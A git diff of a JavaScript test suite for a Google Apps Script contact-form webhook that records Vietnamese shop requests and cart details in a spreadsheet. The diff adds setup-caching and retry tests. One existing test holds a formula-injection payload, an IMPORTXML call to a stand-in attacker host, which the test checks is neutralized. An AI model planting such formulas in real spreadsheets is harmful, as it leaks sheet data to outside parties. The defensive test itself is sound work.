@@ -174,6 +174,11 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
       this.store.set(key, value);
     },
   };
+  const scriptPropertiesStore = new Map([["CONTACT_WEBHOOK_SECRET", "shared-secret"]]);
+  const scriptProperties = {
+    getProperty(key) { return scriptPropertiesStore.get(key) ?? null; },
+    setProperty(key, value) { scriptPropertiesStore.set(key, value); return this; },
+  };
   const context = vm.createContext({
     CacheService: { getScriptCache: () => cache },
     ContentService: {
@@ -184,7 +189,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
     },
     JSON,
     LockService: { getScriptLock: () => lock },
-    PropertiesService: { getScriptProperties: () => ({ getProperty: () => "shared-secret" }) },
+    PropertiesService: { getScriptProperties: () => scriptProperties },
     Session: { getEffectiveUser: () => "owner@example.test", getScriptTimeZone: () => "Asia/Ho_Chi_Minh" },
     SpreadsheetApp: {
       ProtectionType: { SHEET: "SHEET" },
@@ -205,7 +210,7 @@ async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
   });
   const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
   vm.runInContext(source, context);
-  return { cache, context, lock, operations, rows, sheets, toasts };
+  return { cache, context, lock, operations, rows, scriptProperties, sheets, toasts };
 }
 
 function submit(context, payload) {
@@ -357,6 +362,19 @@ test("creates a distinct reference and row for every accepted submit", async () 
   assertTimestamp(rows[2][1]);
   assertTimestamp(rows[2][14]);
   assert.equal(rows[2][1], rows[2][14]);
+});
+
+test("initializes request workbook once, then avoids repeating slow sheet setup", async () => {
+  const { context, operations, scriptProperties } = await loadTemplate();
+  const setup = context.setupRequestWorkbook;
+  let setupCalls = 0;
+  context.setupRequestWorkbook = function () { setupCalls += 1; return setup(); };
+
+  submit(context, validProductPayload);
+  submit(context, validProductPayload);
+
+  assert.equal(setupCalls, 1);
+  assert.equal(scriptProperties.getProperty("CONTACT_REQUEST_SETUP_VERSION"), "7");
 });
 
 test("rejects mixed and malformed contexts without appending rows", async () => {
@@ -559,12 +577,12 @@ test("writes cart detail rows before the Yêu cầu row that commits them", asyn
 
   const response = JSON.parse(submit(context, validCartPayload).value);
 
-  assert.deepEqual(response, { ok: true, reference: "YC-20260725-100000-ABCD1234" });
-  const detailWrite = operations.findIndex((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.rows === 2);
+  assert.deepEqual(response, { ok: true, reference: "YC-" + validCartPayload.request_id.toUpperCase() });
+  const detailWrite = operations.findIndex((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.method === "setValues");
   const requestWrite = operations.findIndex((entry) => entry.sheet === "Yêu cầu" && entry.method === "setValues" && entry.rows === 1);
   assert.notEqual(detailWrite, -1);
   assert.ok(detailWrite < requestWrite, "detail rows must be written before the request row");
-  assert.equal(operations.filter((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.method === "setValues").length, 1);
+  assert.equal(operations.filter((entry) => entry.sheet === "Chi tiết giỏ hàng" && entry.method === "setValues").length, 2);
   assert.equal(rows.length, 2);
   assert.equal(sheets.get("Chi tiết giỏ hàng").getLastRow(), 3);
 });
@@ -630,7 +648,7 @@ test("neutralizes formula-shaped detail text before writing it", async () => {
 
   const detailSheet = sheets.get("Chi tiết giỏ hàng");
   assert.deepEqual(detailRow(detailSheet, 2), [
-    "YC-20260725-100000-ABCD1234",
+    "YC-" + validCartPayload.request_id.toUpperCase(),
     1,
     "'=IMPORTXML(\"https://attacker.example\", \"//x\")",
     "'+Vị vani",
@@ -701,6 +719,12 @@ test("replays the same reference for a retried request id without duplicating ro
   assert.ok(cache.puts[0].key.includes(validCartPayload.request_id));
   assert.equal(cache.puts[0].value, first.reference);
   assert.ok(cache.puts[0].seconds > 0);
+
+  cache.store.clear(); // Simulates a retry days later, beyond the six-hour cache.
+  const lateRetry = JSON.parse(submit(context, validCartPayload).value);
+  assert.equal(lateRetry.reference, first.reference);
+  assert.equal(rows.length, 2);
+  assert.equal(sheets.get("Chi tiết giỏ hàng").getLastRow(), 3);
 
   const distinct = JSON.parse(submit(context, {
     ...validCartPayload,
